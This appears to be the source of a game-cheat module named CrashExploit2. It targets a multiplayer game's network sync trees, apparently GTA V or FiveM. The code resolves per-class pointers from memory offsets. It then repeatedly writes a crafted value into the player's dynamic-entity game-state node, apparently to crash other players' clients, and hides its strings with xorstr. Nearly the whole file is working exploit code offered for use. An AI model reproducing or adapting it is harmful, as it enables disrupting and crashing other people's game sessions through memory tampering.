#include <Core/SDK/Memory.hpp>
#include <Core/Offsets.hpp>
#include <Includes/Includes.hpp>

namespace CrashExploit2 {

    inline uintptr_t Getter(const std::string& sClassName) {
        uintptr_t pSyncTree = Core::Mem.ModBase + g_Offsets.m_OffsetPool;
        uintptr_t mPointer = 0;

        if (sClassName == "CPedSyncTree") {
            mPointer = pSyncTree + 0x26;
        }
        else if (sClassName == "CObjectSyncTree") {
            mPointer = pSyncTree + 0x2E;
        }
        else if (sClassName == "CHeliSyncTree") {
            mPointer = pSyncTree + 0x36;
        }
        else if (sClassName == "CDoorSyncTree") {
            mPointer = pSyncTree + 0x3E;
        }
        else if (sClassName == "CBoatSyncTree") {
            mPointer = pSyncTree + 0x46;
        }
        else if (sClassName == "CBikeSyncTree") {
            mPointer = pSyncTree + 0x4E;
        }
        else if (sClassName == "CAutomobileSyncTree") {
            mPointer = pSyncTree + 0x56;
        }
        else if (sClassName == "CPickupSyncTree") {
            mPointer = pSyncTree + 0x5E;
        }
        else if (sClassName == "CTrainSyncTree") {
            mPointer = pSyncTree + 0x82;
        }
        else if (sClassName == "CPlayerSyncTree") {
            mPointer = pSyncTree + 0x8A;
        }
        else if (sClassName == "CSubmarineSyncTree") {
            mPointer = pSyncTree + 0x92;
        }
        else if (sClassName == "CPlaneSyncTree") {
            mPointer = pSyncTree + 0x9A;
        }
        else if (sClassName == "CPickupPlacementSyncTree") {
            mPointer = pSyncTree + 0xA2;
        }

        std::cout << "SyncTree :" << std::hex << pSyncTree << std::endl;
        std::cout << "mPointer :" << std::hex << mPointer << std::endl;

        int iPointer = Mem.Read<int>(mPointer + 3) + 7;
        int mipointer = mPointer + iPointer;

        return Mem.Read<uintptr_t>(mPointer + iPointer);
    }

    inline void Force(int ms) {
        auto CPlayerSyncTree = Getter(xorstr("CPlayerSyncTree"));
        auto CDynamicEntityGameStateDataNode = Mem.Read<uintptr_t>(CPlayerSyncTree + 0x40);

        std::cout << "CDynamicEntityGameStateDataNode antes :" << std::hex << CDynamicEntityGameStateDataNode << std::endl;

        auto currentTime = std::chrono::steady_clock::now();
        auto endTime = currentTime + std::chrono::milliseconds(ms);

        while (std::chrono::steady_clock::now() < endTime) {
            Mem.Write(CDynamicEntityGameStateDataNode + 0xC8, 1501);
        }

        std::cout << "CPlayerSyncTree :" << std::hex << CPlayerSyncTree << std::endl;
        std::cout << "CDynamicEntityGameStateDataNode depois :" << std::hex << CDynamicEntityGameStateDataNode << std::endl;
        std::cout << "CPlayerSyncTree :" << std::hex << CPlayerSyncTree << std::endl;
    }
}